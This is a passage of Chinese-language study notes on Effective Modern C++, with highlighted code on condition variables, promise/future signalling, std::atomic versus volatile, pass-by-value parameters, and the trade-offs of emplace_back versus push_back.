class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">…                                   <span class="hljs-comment">//检测事件</span><br>cv.notify_one();                    <span class="hljs-comment">//通知反应任务</span><br></code></pre></div></td></tr></table></figure><p>如果有多个反应任务需要被通知，使用<code>notify_all</code>代替<code>notify_one</code>。</p><p>线程API的存在一个事实（不只是C++），等待一个条件变量的代码即使在条件变量没有被通知时，也可能被唤醒，这种唤醒被称为<strong>虚假唤醒</strong>（<em>spuriouswakeups</em>）。</p><p>正确的代码通过确认要等待的条件确实已经发生来处理这种情况，并将这个操作作为唤醒后的第一个操作。C++条件变量的API使得这种问题很容易解决，因为允许把一个测试要等待的条件的<em>lambda</em>（或者其他函数对象）传给<code>wait</code>。因此，可以将反应任务<code>wait</code>调用这样写：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">cv.wait(lk, <br>        []&#123; <span class="hljs-keyword">return</span> whether the evet has occurred; &#125;);<br></code></pre></div></td></tr></table></figure><p>使用 <em>condition variable</em> 的示例：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::condition_variable cv;             <br><span class="hljs-built_in">std</span>::mutex m;<br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">flag</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span></span>;                       <span class="hljs-comment">//不是std::atomic</span><br>…                                       <span class="hljs-comment">//检测某个事件</span><br>&#123;<br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::lock_guard&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title">g</span><span class="hljs-params">(m)</span></span>;   <span class="hljs-comment">//通过g的构造函数锁住m</span><br>    flag = <span class="hljs-literal">true</span>;                        <span class="hljs-comment">//通知反应任务（第1部分）</span><br>&#125;                                       <span class="hljs-comment">//通过g的析构函数解锁m</span><br>cv.notify_one();                        <span class="hljs-comment">//通知反应任务（第2部分）</span><br></code></pre></div></td></tr></table></figure><p>反应任务代码如下:</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">…                                       <span class="hljs-comment">//准备作出反应</span><br>&#123;                                       <br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::unique_lock&lt;<span class="hljs-built_in">std</span>::mutex&gt; <span class="hljs-title">lk</span><span class="hljs-params">(m)</span></span>; <br>    cv.wait(lk, [] &#123; <span class="hljs-keyword">return</span> flag; &#125;);   <span class="hljs-comment">//使用lambda来避免虚假唤醒</span><br>    …                                   <span class="hljs-comment">//对事件作出反应（m被锁定）</span><br>&#125;<br>…                                       <span class="hljs-comment">//继续反应动作（m现在解锁）</span><br></code></pre></div></td></tr></table></figure><h3><span id="原子变量轮询">原子变量轮询</span></h3><p>使用原子变量的示例：</p><p>当检测线程识别到发生的事件，将flag置位：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">bool</span>&gt; <span class="hljs-title">flag</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span></span>;          <span class="hljs-comment">//共享的flag</span><br>…                                       <span class="hljs-comment">//检测某个事件</span><br>flag = <span class="hljs-literal">true</span>;                            <span class="hljs-comment">//告诉反应线程</span><br></code></pre></div></td></tr></table></figure><p>就其本身而言，反应线程轮询该flag。当发现flag被置位，它就知道等待的事件已经发生了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">…                                       <span class="hljs-comment">//准备作出反应</span><br><span class="hljs-keyword">while</span> (!flag);                          <span class="hljs-comment">//等待事件</span><br>…                                       <span class="hljs-comment">//对事件作出反应</span><br></code></pre></div></td></tr></table></figure><p>这里多出了轮询的开销。</p><h3><span id="promise-future">promise + future</span></h3><p>检测任务使用<code>std::promise&lt;void&gt;</code>，反应任务使用<code>std::future&lt;void&gt;</code>或者<code>std::shared_future&lt;void&gt;</code>。当感兴趣的事件发生时，检测任务设置<code>std::promise&lt;void&gt;</code>，反应任务在<em>future</em>上<code>wait</code>。</p><p>尽管反应任务不从检测任务那里接收任何数据，通信信道也可以让反应任务知道，检测任务什么时候已经通过对<code>std::promise&lt;void&gt;</code>调用<code>set_value</code>“写入”了<code>void</code>数据。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::promise&lt;<span class="hljs-keyword">void</span>&gt; p;                   <span class="hljs-comment">//通信信道的promise</span><br></code></pre></div></td></tr></table></figure><p>检测任务代码很简洁：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">…                                       <span class="hljs-comment">//检测某个事件</span><br>p.set_value();                          <span class="hljs-comment">//通知反应任务</span><br></code></pre></div></td></tr></table></figure><p>反应任务代码也同样简单：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">…                                       <span class="hljs-comment">//准备作出反应</span><br>p.get_future().wait();                  <span class="hljs-comment">//等待对应于p的那个future</span><br>…                                       <span class="hljs-comment">//对事件作出反应</span><br></code></pre></div></td></tr></table></figure><p>像使用flag的方法一样，此设计不需要互斥锁，无论在反应线程调用<code>wait</code>之前检测线程是否设置了<code>std::promise</code>都可以工作，并且不受虚假唤醒的影响（只有条件变量才容易受到此影响）。</p><p>与基于条件变量的方法一样，反应任务在调用<code>wait</code>之后是真被阻塞住的，不会一直占用系统资源。</p><p>但是以上代码中，<code>std::promise</code>和<em>future</em>之间有个共享状态，并且共享状态是动态分配的。因此你应该假定此设计会产生基于堆的分配和释放开销。</p><p><code>std::promise</code>只能设置一次。<code>std::promise</code>和<em>future</em>之间的通信是<strong>一次性</strong>的：不能重复使用。这是与基于条件变量或者基于flag的设计的明显差异，条件变量和flag都可以通信多次。</p><p>假设你仅仅想要对某线程挂起一次（在创建后，运行线程函数前），使用<code>void</code>的<em>future</em>就是一个可行方案。</p><p>通过<code>share</code>获得的<code>shared_future</code>要被在反应线程中运行的<em>lambda</em>按值捕获：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::promise&lt;<span class="hljs-keyword">void</span>&gt; p;                   <span class="hljs-comment">//跟之前一样</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">detect</span><span class="hljs-params">()</span>                           <span class="hljs-comment">//现在针对多个反映线程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 写在前面，防止异常发生，p.set_value() 不执行</span><br>    <span class="hljs-keyword">auto</span> sf = p.get_future().share();   <span class="hljs-comment">//sf的类型是std::shared_future&lt;void&gt;</span><br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::thread&gt; vt;        <span class="hljs-comment">//反应线程容器</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; threadsToRun; ++i) &#123;<br>        vt.emplace_back([sf]&#123; sf.wait();    <span class="hljs-comment">//在sf的局部副本上wait；</span><br>                              react(); &#125;);  <br>    &#125;<br>    …                                   <span class="hljs-comment">//如果这个“…”抛出异常，detect挂起！</span><br>    p.set_value();                      <span class="hljs-comment">//所有线程解除挂起</span><br>    …<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span>&amp; t : vt) &#123;                <span class="hljs-comment">//使所有线程不可结合；</span><br>        t.join();                       <span class="hljs-comment">//“auto&amp;”见条款2</span><br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>三种简单事件通信：使用条件变量、使用原子变量、使用<code>promise + future</code></li><li><code>promise + future</code>的方式，在单次事件通信时，更有优势</li></ul><h2><span id="40并发使用stdatomic特殊内存使用volatile">40并发使用<code>std::atomic</code>，特殊内存使用<code>volatile</code></span></h2><p>如下使用<code>std::atmoic</code>的代码：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">int</span>&gt; <span class="hljs-title">ai</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;         <span class="hljs-comment">//初始化ai为0</span><br>ai = <span class="hljs-number">10</span>;                        <span class="hljs-comment">//原子性地设置ai为10</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; ai;                <span class="hljs-comment">//原子性地读取ai的值</span><br>++ai;                           <span class="hljs-comment">//原子性地递增ai到11</span><br>--ai;                           <span class="hljs-comment">//原子性地递减ai到10</span><br></code></pre></div></td></tr></table></figure><p>在这些语句执行过程中，其他线程读取<code>ai</code>，只能读取到0，10，11三个值其中一个。假设只有这个线程会修改<code>ai</code>，没有其他可能的值。</p><p>使用<code>volatile</code>在多线程中实际上不保证任何事情：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">volatile</span> <span class="hljs-keyword">int</span> <span class="hljs-title">vi</span><span class="hljs-params">(<span class="hljs-number">0</span>)</span></span>;             <span class="hljs-comment">//初始化vi为0</span><br>vi = <span class="hljs-number">10</span>;                        <span class="hljs-comment">//设置vi为10 </span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">cout</span> &lt;&lt; vi;                <span class="hljs-comment">//读vi的值</span><br>++vi;                           <span class="hljs-comment">//递增vi到11</span><br>--vi;                           <span class="hljs-comment">//递减vi到10</span><br></code></pre></div></td></tr></table></figure><p>代码的执行过程中，如果其他线程读取<code>vi</code>，可能读到任何值，比如-12，68，4090727——任何值！这份代码有未定义行为，因为这里的语句修改<code>vi</code>，所以如果同时其他线程读取<code>vi</code>，同时存在多个readers和writers读取没有<code>std::atomic</code>或者互斥锁保护的内存，这就是数据竞争的定义。</p><h3><span id="指令排序">指令排序</span></h3><blockquote><p>代码执行本身，即使编译器没有重排顺序，底层硬件也可能重排（或者可能使它看起来运行在其他核心上），因为有时这样代码执行更快。</p><p>然而，<code>std::atomic</code>会限制这种重排序，保持了指令执行的有序性。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::atomic&lt;<span class="hljs-keyword">bool</span>&gt; <span class="hljs-title">valVailable</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span></span>; <br><span class="hljs-keyword">auto</span> imptValue = computeImportantValue();   <span class="hljs-comment">//计算值</span><br>valAvailable = <span class="hljs-literal">true</span>;                        <span class="hljs-comment">//告诉另一个任务，值可用了</span><br></code></pre></div></td></tr></table></figure><p>编译器不仅要保证<code>imptValue</code>和<code>valAvailable</code>的赋值顺序，还要保证生成的硬件代码不会改变这个顺序。结果就是，将<code>valAvailable</code>声明为<code>std::atomic</code>确保了必要的顺序——其他线程看到的是<code>imptValue</code>值的改变不会晚于<code>valAvailable</code>。</p><p>将<code>valAvailable</code>声明为<code>volatile</code>不能保证上述顺序：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">volatile</span> <span class="hljs-keyword">bool</span> <span class="hljs-title">valVailable</span><span class="hljs-params">(<span class="hljs-literal">false</span>)</span></span>; <br><span class="hljs-keyword">auto</span> imptValue = computeImportantValue();<br>valAvailable = <span class="hljs-literal">true</span>;                        <span class="hljs-comment">//其他线程可能看到这个赋值操作早于imptValue的赋值操作</span><br></code></pre></div></td></tr></table></figure><p>这份代码编译器可能将<code>imptValue</code>和<code>valAvailable</code>赋值顺序对调。</p><h3><span id="结论">结论</span></h3><ul><li><code>std::atomic</code>用于在不使用互斥锁情况下，来使变量被多个线程访问的情况。是用来编写并发程序的一个工具。</li><li><code>volatile</code>用在读取和写入不应被优化掉的内存上。是用来处理特殊内存的一个工具。</li></ul><h2><span id="其他优化">其他优化</span></h2><h2><span id="41对于移动成本低且总是被拷贝的可拷贝形参考虑按值传递">41对于移动成本低且总是被拷贝的可拷贝形参，考虑按值传递</span></h2><p>三个版本的<code>addName</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                                  <span class="hljs-comment">//方法1：对左值和右值重载</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addName</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp; newName)</span></span><br><span class="hljs-function">    </span>&#123; names.push_back(newName); &#125; <span class="hljs-comment">// rvalues</span><br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addName</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&amp;&amp; newName)</span></span><br><span class="hljs-function">    </span>&#123; names.push_back(<span class="hljs-built_in">std</span>::move(newName)); &#125;<br>    …<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; names;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                                  <span class="hljs-comment">//方法2：使用通用引用</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addName</span><span class="hljs-params">(T&amp;&amp; newName)</span></span><br><span class="hljs-function">    </span>&#123; names.push_back(<span class="hljs-built_in">std</span>::forward&lt;T&gt;(newName)); &#125;<br>    …<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Widget</span> &#123;</span>                                  <span class="hljs-comment">//方法3：传值</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">addName</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> newName)</span></span><br><span class="hljs-function">    </span>&#123; names.push_back(<span class="hljs-built_in">std</span>::move(newName)); &#125;<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p>我将前两个版本称为“按引用方法”，因为都是通过引用传递形参。</p><p>仍然考虑这两种调用方式：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">Widget w;<br>…<br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> <span class="hljs-title">name</span><span class="hljs-params">(<span class="hljs-string">"Bart"</span>)</span></span>;<br>w.addName(name);                                <span class="hljs-comment">//传左值</span><br>…<br>w.addName(name + <span class="hljs-string">"Jenne"</span>);                      <span class="hljs-comment">//传右值</span><br></code></pre></div></td></tr></table></figure><p>现在分别考虑三种实现中，给<code>Widget</code>添加一个名字的两种调用方式，拷贝和移动操作的开销。</p><ul><li><p><strong>重载</strong>：无论传递左值还是传递右值，调用都会绑定到一个叫<code>newName</code>的引用上。从拷贝和移动操作方面看，这个过程零开销。左值重载中，<code>newName</code>拷贝到<code>Widget::names</code>中，右值重载中，移动进去。</p><p>​ 开销总结：左值一次拷贝，右值一次移动。</p></li><li><p><strong>使用通用引用</strong>：同重载一样，调用也绑定到<code>addName</code>这个引用上，没有开销。由于使用了<code>std::forward</code>，左值<code>std::string</code>实参会拷贝到<code>Widget::names</code>，右值<code>std::string</code>实参移动进去。</p><p>​对<code>std::string</code>实参来说，开销同重载方式一样：左值一次拷贝，右值一次移动。</p></li><li><p><strong>按值传递</strong>：无论传递左值还是右值，都必须构造<code>newName</code>形参。如果传递的是左值，需要拷贝的开销，如果传递的是右值，需要移动的开销。在函数的实现中，<code>newName</code>总是采用移动的方式到<code>Widget::names</code>。</p><p>​ 开销总结：左值实参，一次拷贝一次移动，右值实参两次移动。</p></li></ul><p>对于特殊的场景，可拷贝且移动开销小的类型，传递给总是会拷贝他们的一个函数，切片也不需要考虑，。这时，按值传递就提供了一种简单的实现方式，效率接近传递引用的函数，但是避免了传引用方案的缺点。</p><blockquote><p>当移动的开销较低，额外的一次移动才能被开发者接受，但是当移动的开销很大，执行不必要的移动就类似执行一个不必要的拷贝，也就是避免不必要的拷贝。</p><p>对于<strong>可拷贝形参</strong>使用按值传递。不符合此条件的的形参必须有只可移动的类型（<em>move-onlytypes</em>）。</p><p>只会在目标代码中生成一个函数。避免了通用引用的种种问题。</p><p>只对<strong>总是被拷贝</strong>的形参考虑按值传递。因为传引用可以避免这个不必要的开销。</p></blockquote><h3><span id="结论">结论</span></h3><ul><li><p>对于可拷贝，移动开销低，而且无条件被拷贝的形参，按值传递效率基本与按引用传递效率一致，而且易于实现，还生成更少的目标代码。</p></li><li><p>某些情况下，通过构造拷贝形参可能比通过赋值拷贝形参开销大的多。</p></li><li><p>按值传递会引起切片问题，所说不适合基类形参类型。</p></li></ul><h2><span id="42-emplacement-而不是insertion">42 emplacement 而不是insertion</span></h2><p>编译器处理的下面的调用：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">vs.push_back(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>(<span class="hljs-string">"xyzzy"</span>)); <span class="hljs-comment">//创建临时std::string，把它传给push_back</span><br></code></pre></div></td></tr></table></figure><p>为了在<code>std::string</code>容器中创建新元素，调用了<code>std::string</code>的构造函数，但是这份代码并不仅调用了一次构造函数，而是调用了两次，而且还调用了<code>std::string</code>析构函数。下面是在<code>push_back</code>运行时发生了什么：</p><ol type="1"><li>一个<code>std::string</code>的临时对象从字面量“<code>xyzzy</code>”被创建。这个对象没有名字，我们可以称为<code>temp</code>。<code>temp</code>的构造是第一次<code>std::string</code>构造。因为是临时变量，所以<code>temp</code>是右值。</li><li><code>temp</code>被传递给<code>push_back</code>的右值重载函数，绑定到右值引用形参<code>x</code>。在<code>std::vector</code>的内存中一个<code>x</code>的副本被创建。这次构造——也是第二次构造——在<code>std::vector</code>内部真正创建一个对象。</li><li>在<code>push_back</code>返回之后，<code>temp</code>立刻被销毁，调用了一次<code>std::string</code>的析构函数。</li></ol><p>使用传递给它的任何实参直接在<code>std::vector</code>内部构造一个<code>std::string</code>。没有临时变量会生成：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">vs.emplace_back(<span class="hljs-string">"xyzzy"</span>);           <span class="hljs-comment">//直接用“xyzzy”在vs内构造std::string</span><br></code></pre></div></td></tr></table></figure><p><code>emplace_back</code>使用完美转发，因此只要你没有遇到使用完美转发的限制，就可以传递任何实参以及组合到<code>emplace_back</code>。</p><p><code>emplace_back</code>：</p><ul><li><strong>值是通过构造函数添加到容器，而不是直接赋值。</strong></li><li><strong>传递的实参类型与容器的初始化类型不同。</strong></li><li><strong>容器不拒绝重复项作为新值。</strong></li></ul><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">vs.emplace_back(<span class="hljs-string">"xyzzy"</span>);              <span class="hljs-comment">//在容器末尾构造新值；不是传递的容器中元</span><br>                                       <span class="hljs-comment">//素的类型；没有使用拒绝重复项的容器</span><br></code></pre></div></td></tr></table></figure><h3><span id="资源管理">资源管理</span></h3><p>假定你有一个盛放<code>std::shared_ptr&lt;Widget&gt;</code>s的容器，</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">list</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;&gt; ptrs;<br></code></pre></div></td></tr></table></figure><p>使用<code>push_back</code>的代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">ptrs.push_back(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;(<span class="hljs-keyword">new</span> Widget, killWidget));<br></code></pre></div></td></tr></table></figure><p>也可以像这样：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">ptrs.push_back(&#123;<span class="hljs-keyword">new</span> Widget, killWidget&#125;);<br></code></pre></div></td></tr></table></figure><p>不管哪种写法，在调用<code>push_back</code>前会生成一个临时<code>std::shared_ptr</code>对象。<code>push_back</code>的形参是<code>std::shared_ptr</code>的引用，因此必须有一个<code>std::shared_ptr</code>。</p><p>用<code>emplace_back</code>应该可以避免<code>std::shared_ptr</code>临时对象的创建，但是在这个场景下，临时对象值得被创建。考虑如下可能的时间序列：</p><ol type="1"><li>在上述的调用中，一个<code>std::shared_ptr&lt;Widget&gt;</code>的临时对象被创建来持有“<code>new Widget</code>”返回的原始指针。称这个对象为<code>temp</code>。</li><li><code>push_back</code>通过引用接受<code>temp</code>。在存储<code>temp</code>的副本的<em>list</em>节点的内存分配过程中，内存溢出异常被抛出。</li><li>随着异常从<code>push_back</code>的传播，<code>temp</code>被销毁。作为唯一管理这个<code>Widget</code>的<code>std::shared_ptr</code>，它自动销毁<code>Widget</code>，在这里就是调用<code>killWidget</code>。</li></ol><p>这样的话，即使发生了异常，没有资源泄漏。</p><p>考虑使用<code>emplace_back</code>代替<code>push_back</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">ptrs.emplace_back(<span class="hljs-keyword">new</span> Widget, killWidget);<br></code></pre></div></td></tr></table></figure><ol type="1"><li>通过<code>new Widget</code>创建的原始指针完美转发给<code>emplace_back</code>中，<em>list</em>节点被分配的位置。如果分配失败，还是抛出内存溢出异常。</li><li>当异常从<code>emplace_back</code>传播，原始指针是仅有的访问堆上<code>Widget</code>的途径，但是因为异常而丢失了，那个<code>Widget</code>的资源（以及任何它所拥有的资源）发生了泄漏。</li></ol><p>在这个场景中，生命周期不良好，这个失误不能赖<code>std::shared_ptr</code>。使用带自定义删除器的<code>std::unique_ptr</code>也会有同样的问题。</p><p>解决方法是：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget,      <span class="hljs-comment">//创建Widget，让spw管理它</span></span></span><br><span class="hljs-function"><span class="hljs-params">                            killWidget)</span></span>;<br>ptrs.push_back(<span class="hljs-built_in">std</span>::move(spw));              <span class="hljs-comment">//添加spw右值</span><br></code></pre></div></td></tr></table></figure><p><code>emplace_back</code>的版本如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">spw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget, killWidget)</span></span>;<br>ptrs.emplace_back(<span class="hljs-built_in">std</span>::move(spw));<br></code></pre></div></td></tr></table></figure><p>无论哪种方式，都会产生<code>spw</code>的创建和销毁成本。</p><h3><span id="与explicit的构造函数的交互">与<code>explicit</code>的构造函数的交互</span></h3><p>相似的初始化语句导致了多么不一样的结果：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::regex r1 = <span class="hljs-literal">nullptr</span>;                 <span class="hljs-comment">//错误！不能编译</span><br><span class="hljs-function"><span class="hljs-built_in">std</span>::regex <span class="hljs-title">r2</span><span class="hljs-params">(<span class="hljs-literal">nullptr</span>)</span></span>;                  <span class="hljs-comment">//可以编译</span><br></code></pre></div></td></tr></table></figure><p>在标准的官方术语中，用于初始化<code>r1</code>的语法（使用等号）是所谓的<strong>拷贝初始化</strong>。相反，用于初始化<code>r2</code>的语法是（使用小括号，有时也用花括号）被称为<strong>直接初始化</strong>。</p><p>emplace_back使用直接初始化，这意味着可能使用<code>explicit</code>的构造函数。</p><p>push_back使用拷贝初始化，所以不能用<code>explicit</code>的构造函数。因此：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp">regexes.emplace_back(<span class="hljs-literal">nullptr</span>);           <span class="hljs-comment">//可编译。直接初始化允许使用接受指针的</span><br>                                         <span class="hljs-comment">//std::regex的explicit构造函数</span><br>regexes.push_back(<span class="hljs-literal">nullptr</span>);              <span class="hljs-comment">//错误！拷贝初始化不允许用那个构造函数</span><br></code></pre></div></td></tr></table></figure><p>获得的经验是，当你使用<code>emplace_back</code>时，请特别小心确保传递了正确的实参，因为即使是<code>explicit</code>的构造函数也会被编译器考虑，编译器会试图以有效方式解释你的代码。</p><h3><span 